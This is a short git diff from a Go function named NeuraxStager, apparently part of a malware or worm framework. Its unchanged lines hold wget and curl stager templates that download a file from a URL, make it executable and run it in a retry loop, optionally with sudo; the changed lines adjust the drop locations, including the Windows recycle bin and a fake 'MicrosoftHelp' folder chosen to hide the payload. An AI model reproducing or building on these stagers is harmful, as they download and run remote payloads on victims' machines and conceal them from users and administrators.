@@ -228,9 +228,9 @@ func NeuraxStager() string {
 		[]string{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
 		[]string{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
 	}
-	linux_save_paths := []string{"/tmp", "/lib", "/home",
+	linux_save_paths := []string{"/tmp", "/lib", "~",
 		"/etc", "/usr", "/usr/share"}
-	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
+	windows_save_paths := []string{`%SYSTEMDRIVE%\$recycle.bin\`, `%ALLUSERSAPPDATA%\MicrosoftHelp\`}
 	switch N.Platform {
 	case "windows":
 		stagers = windows_stagers
